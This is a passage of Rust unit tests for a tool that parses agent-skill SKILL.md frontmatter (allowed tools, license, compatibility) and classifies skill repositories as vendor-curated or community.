        // Spec form: bare string, space-separated.
        let body = "---\nname: x\nallowed-tools: Bash(git:*) Bash(jq:*) Read\n---\nbody";
        let (fm, _) = split_frontmatter(body);
        assert_eq!(fm.allowed_tools, vec!["Bash(git:*)", "Bash(jq:*)", "Read"]);
    }

    #[test]
    fn frontmatter_allowed_tools_bracketed_list_still_works() {
        // Legacy form must keep working — we tolerate both.
        let body = "---\nname: x\nallowed-tools: [Read, Grep, Bash]\n---\nbody";
        let (fm, _) = split_frontmatter(body);
        assert_eq!(fm.allowed_tools, vec!["Read", "Grep", "Bash"]);
    }

    #[test]
    fn frontmatter_preserves_license_and_compatibility() {
        let body = "---\n\
            name: x\n\
            description: d\n\
            license: MIT\n\
            compatibility: Requires Python 3.14+ and uv\n\
            ---\nbody";
        let (fm, _) = split_frontmatter(body);
        assert_eq!(fm.license.as_deref(), Some("MIT"));
        assert_eq!(
            fm.compatibility.as_deref(),
            Some("Requires Python 3.14+ and uv")
        );
    }

    #[test]
    fn classify_vendor_known_orgs() {
        assert_eq!(classify_vendor("anthropics/skills"), "vendor-curated");
        assert_eq!(classify_vendor("warpdotdev/oz-skills"), "vendor-curated");
        assert_eq!(classify_vendor("openai/codex"), "vendor-curated");
        // Case-insensitive match for orgs like `OpenHands` whose canonical
        // capitalization differs from typical lowercase convention.
        assert_eq!(classify_vendor("openhands/some-repo"), "vendor-curated");
    }

    #[test]
    fn classify_vendor_unknown_is_community() {
        assert_eq!(
            classify_vendor("alirezarezvani/claude-skills"),
            "community"
        );
        assert_eq!(classify_vendor("Jeffallan/claude-skills"), "community");
        assert_eq!(classify_vendor("random-user/random-repo"), "community");
        // Single-segment src (local dir test) — falls back to community.
        assert_eq!(classify_vendor("oz-skills-test"), "community");
    }

    #[test]
    fn build_record_emits_vendor_and_optional_tags() {
        let sf = SkillFile {
            src: "warpdotdev/oz-skills".to_string(),
            name: "mcp-builder".to_string(),
            rel_path: PathBuf::from(".agents/skills/mcp-builder/SKILL.md"),
            body: "---\n\
                name: mcp-builder\n\
                description: Build high-quality MCP servers.\n\
                license: Complete terms in LICENSE.txt\n\
                ---\n\
                # Body\n"
                .to_string(),
        };
        let rec = build_record(&sf).expect("record");
        let has = |needle: &str| rec.tags.iter().any(|t| t == needle);
        assert!(has("skill"));
        assert!(has("src:warpdotdev/oz-skills"));
        assert!(has("vendor:vendor-curated"), "tags={:?}", rec.tags);
        assert!(
            has("license:Complete terms in LICENSE.txt"),
            "license must be preserved; tags={:?}",
            rec.tags
        );
        assert!(rec.content.starts_with("Build high-quality MCP servers."));
    }

    #[test]
    fn build_record_community_vendor_classification() {
        let sf = SkillFile {
            src: "alirezarezvani/claude-skills".to_string(),
            name: "marketing".to_string(),
            rel_path: PathBuf::from("skills/marketing/SKILL.md"),
            body: "---\nname: marketing\ndescription: d\n---\nbody".to_string(),
        };
        let rec = build_record(&sf).expect("record");
        assert!(
            rec.tags.iter().any(|t| t == "vendor:community"),
            "tags={:?}",
            rec.tags
        );
    }

}
